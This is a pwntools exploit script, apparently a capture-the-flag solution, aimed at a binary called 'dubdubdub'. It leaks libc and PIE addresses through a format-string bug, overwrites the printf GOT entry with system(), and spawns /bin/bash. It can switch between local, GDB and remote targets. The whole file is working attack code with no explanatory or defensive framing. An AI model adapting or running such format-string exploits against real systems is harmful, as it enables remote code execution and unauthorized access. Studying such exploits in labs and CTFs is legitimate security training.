from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(**locals())

# Binary filename
exe = "./dubdubdub"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "info"
warnings.filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

libc =  ELF("./libc.so.6")

# ===========================================================
#           Leak libc and calculate libc base address 
# ===========================================================

# out = ""
# for i in range(30,60):
#     out += f"{i}=%{i}$p "
# print(out)
# io.sendline(out)

io.sendline("kali")
io.sendline("Libc="+ "%43$p")
io.recvuntil("Libc=")

leak = int(io.recvline().strip().decode()[0:14], 16) - 128
print("Libc Leak:", hex(leak))
libc.address = leak - (0x7f63dbe29d10- 0x7f63dbe00000)
print("Libc base address:", hex(libc.address))

# ===========================================================
#           Calculate ELF base address
# ===========================================================

io.sendline("kali")
io.sendline("Pie="+ "%45$p")
io.recvuntil("Pie=")

leak = int(io.recvline().strip().decode()[0:14], 16)
print("Pie leak", hex(leak))
elf.address = leak - (0x55f62235b229 - 0x55f62235a000)
print("Pie base address", hex(elf.address))

# ===========================================================
#          GOT Overwrite
# ===========================================================

offset = 8
printf = elf.got["printf"]
shell = libc.symbols["system"]
payload = fmtstr_payload(offset, {printf: shell})

io.sendline("kali")
io.sendline(payload)

# ===========================================================
#          Spawn Shell
# ===========================================================

io.sendline('kali')
io.sendline('/bin/bash')

io.interactive()
